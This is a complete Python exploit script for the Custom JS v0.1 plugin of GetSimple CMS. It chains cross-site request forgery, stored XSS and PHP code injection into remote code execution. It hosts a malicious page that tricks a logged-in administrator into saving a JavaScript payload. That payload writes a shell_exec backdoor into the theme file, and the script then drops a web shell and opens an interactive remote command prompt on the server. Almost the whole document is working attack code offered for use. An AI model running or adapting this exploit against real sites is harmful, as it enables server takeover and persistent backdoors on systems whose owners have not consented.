# Exploit Title: GetSimple CMS Custom JS v0.1 - CSRF to Stored XSS to RCE
# Exploit Author: Bobby Cooke (boku) & Abhishek Joshi
# Date: April 30th, 2021
# Vendor Homepage: http://get-simple.info 
# Software Link: http://get-simple.info/download/ & http://get-simple.info/extend/plugin/custom-js/1267/
# Vendor: 4Enzo
# Version: v0.1
# Tested against Server Host: Windows 10 Pro + XAMPP
# Tested against Client Browsers: Firefox (Linux & Windows) & Internet Explorer
# Vulnerability Description:
#    The Custom JS v0.1 plugin for GetSimple CMS suffers from a Cross-Site Request Forgery (CSRF) attack that allows remote unauthenticated attackers to inject arbitrary client-side code into authenticated administrators browsers, which results in Remote Code Execution (RCE) on the hosting server, when an authenticated administrator visits a malicious third party website.
# CVSS v3.1 Vector: AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H
# CVSS Base Score: 9.6

import argparse,requests
from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import (Fore as F, Back as B, Style as S)
from threading import Thread
from time import sleep

FT,FR,FG,FY,FB,FM,FC,ST,SD,SB = F.RESET,F.RED,F.GREEN,F.YELLOW,F.BLUE,F.MAGENTA,F.CYAN,S.RESET_ALL,S.DIM,S.BRIGHT
def bullet(char,color):
    C=FB if color == 'B' else FR if color == 'R' else FG
    return SB+C+'['+ST+SB+char+SB+C+']'+ST+' '
info,err,ok = bullet('-','B'),bullet('-','R'),bullet('!','G')

class theTHREADER(object):
    def __init__(self, interval=1):
        self.interval = interval
        thread = Thread(target=self.run, args=())
        thread.daemon = True
        thread.start()
    def run(self):
        run()

def webshell(target):
    try:
        websh = "{}/webshell.php".format(target,page)
        term = "{}{}PWNSHELL{} > {}".format(SB,FR,FB,ST)
        welcome = '    {}{}]{}+++{}[{}========>{} HelloFriend {}<========{}]{}+++{}[{}'.format(SB,FY,FR,FY,FT,FR,FT,FY,FR,FY,ST)
        print(welcome)
        while True:
            specialmove = input(term)
            command = {'FierceGodKick': specialmove}
            r = requests.post(websh, data=command, verify=False)
            status = r.status_code
            if status != 200:
                r.raise_for_status()
            response = r.text
            print(response)
    except:
        pass


def xhrRcePayload():
    payload  = 'var e=function(i){return encodeURIComponent(i);};'
    payload += 'var gt = decodeURIComponent(&quot;%3c&quot;);'
    payload += 'var lt = decodeURIComponent(&quot;%3e&quot;);'
    payload += 'var h=&quot;application/x-www-form-urlencoded&quot;;'
    payload += 'var u=&quot;/admin/theme-edit.php&quot;;'
    payload += 'var xhr1=new XMLHttpRequest();'
    payload += 'var xhr2=new XMLHttpRequest();'
    payload += 'xhr1.onreadystatechange=function(){'
    payload += 'if(xhr1.readyState==4 && xhr1.status==200){'
    payload += 'r=this.responseXML;'
    payload += 'nVal=r.querySelector(&quot;#nonce&quot;).value;'
    payload += 'eVal=r.forms[1][2].defaultValue;'
    payload += 'xhr2.open(&quot;POST&quot;,u,true);'
    payload += 'xhr2.setRequestHeader(&quot;Content-Type&quot;,h);'
    payload += 'payload=e(gt+&quot;?php echo shell_exec($_REQUEST[solarflare]) ?&quot;+lt);'
    payload += 'params=&quot;nonce=&quot;+nVal+&quot;&content=&quot;+payload+&quot;&edited_file=&quot;+eVal+&quot;&submitsave=Save+Changes&quot;;'
    payload += 'xhr2.send(params);'
    payload += '}};'
    payload += 'xhr1.open(&quot;GET&quot;,u,true);'
    payload += 'xhr1.responseType=&quot;document&quot;;'
    payload += 'xhr1.send();'
    return payload

def csrfPayload():
    payload  = '<html><body>'
    payload += '<form action="'+target+'/admin/load.php?id=CustomJSPlugin" method="POST">'
    payload += '<input type="hidden" name="customjs_url_content" value="">'
    payload += '<input type="hidden" name="customjs_js_content" value="'+xhrRcePayload()+'">'
    payload += '<input type="hidden" name="submit" value="Save Settings">'
    payload += '<input type="submit" value="Submit request">'
    payload += '</form></body></html>'
    return payload

class S(BaseHTTPRequestHandler):
    def do_GET(self):
        victim = self.client_address
        victim = "{}:{}".format(victim[0],victim[1])
        print("{}{} connected to Malicious CSRF Site!".format(ok,victim))
        print('{}Waiting for admin to view a CMS webpage & trigger the XSS XHR -> RCE payload..'.format(info))
        self.wfile.write("{}".format(csrfPayload()).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print('{}Hosting CSRF attack & listening for admin to connect..'.format(info))
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    print('Stopping httpd...')

def tryUploadWebshell(target,page):
    try:
        blind = target+page
        # The ^ symbols are required to escape the <> symbols to create the non-blind webshell (^ is an escape for window cmd prompt)
        webshUpload  = {'solarflare': "echo ^<?php echo shell_exec($_REQUEST['FierceGodKick']) ?^>>webshell.php"}
        requests.post(url=blind, data=webshUpload, verify=False)
    except:
        pass

def checkWebshell(target):
    try:
        websh = "{}/webshell.php".format(target)
        capsule = {'FierceGodKick':'pwnt?'}
        resp = requests.post(url=websh, data=capsule, verify=False)
        return resp.status_code
    except:
        pass

def sig():
    SIG  = SB+FY+"  .-----.._       ,--.            "+FB+"    ___  "+FY+"     ___ _____ _____ _   _ _____ \n"
    SIG += FY+"  |  ..    >  ___ |  | .--.        "+FB+"  /   \\    "+FY+" |_  |  _  /  ___| | | |_   _| \n"
    SIG += FY+"  |  |.'  ,'-'"+FR+"* *"+FY+"'-. |/  /__   __ "+FB+"   \\ O /   "+FY+"    | | | | \\ `--.| |_| | | |  \n"
    SIG += FY+"  |      </ "+FR+"*  *  *"+FY+" \   /   \\/   \\ "+FB+"  / _ \\/\\ "+FY+"    | | | | |`--. \\  _  | | |  \n"
    SIG += FY+"  |  |>   )  "+FR+" * *"+FY+"   /    \\        \\"+FB+" ( (_>  < "+FY+"/\\__/ | \\_/ /\\__/ / | | |_| |_ \n"
    SIG += FY+"  |____..- '-.._..-'_|\\___|._..\\___\\ "+FB+"\\___/\\/"+FY+" \\____/ \\___/\\____/\\_| |_/\\___/\n"
    SIG += FY+"  __"+FR+"linkedin.com/in/bobby-cooke/"+FY+"_____ "+"     __"+FR+"linkedin.com/in/reverse-shell/"+FY+"\n"+ST
    return SIG

def argsetup():
    about  = SB+FB+'  The Custom JS v0.1 plugin for GetSimple CMS suffers from a Cross-Site Request Forgery (CSRF) attack that allows remote unauthenticated attackers to inject arbitrary client-side code into authenticated administrators browsers, which results in Remote Code Execution (RCE) on the hosting server, when an authenticated administrator visits a malicious third party website.\n'+ST
    about += SB+FC+'      CVSS Base Score'+FT+':'+FR+' 9.6  '+FT+'|'+FC+'  CVSS v3.1 Vector'+FT+':'+FR+' AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H'+FC
    parser = argparse.ArgumentParser(description=about, formatter_class=argparse.RawTextHelpFormatter)
    desc1  = ST+FC+'Routable domain name of the target GetSimple CMS instance'+SB
    parser.add_argument('Target',type=str,help=desc1)
    desc2  = ST+FC+'Path to the public page which implements the CMS theme'+ST
    parser.add_argument('PublicPage',type=str,help=desc2)
    args   = parser.parse_args()
    return args

if __name__ == '__main__':
    header    = SB+FR+'                 GetSimple CMS - Custom JS Plugin Exploit\n'
    header   += SB+FB+'          CSRF '+FT+'->'+FB+' Stored XSS '+FT+'->'+FB+' XHR PHP Code Injection '+FT+'->'+FB+' RCE\n'+ST
    header   += SB+FT+'                   '+FR+' Bobby '+FR+'"'+FR+'boku'+FR+'"'+FR+' Cooke & Abhishek Joshi\n'+ST
    print(header)
    args      = argsetup()
    target    = args.Target
    page      = args.PublicPage
    print(sig())
    theTHREADER()
    pwnt = checkWebshell(target)
    if pwnt != 200:
        while pwnt != 200:
            sleep(3)
            tryUploadWebshell(target,page)
            sleep(2)
            pwnt = checkWebshell(target)
    print("{} A wild webshell appears!".format(ok))
    webshell(target)

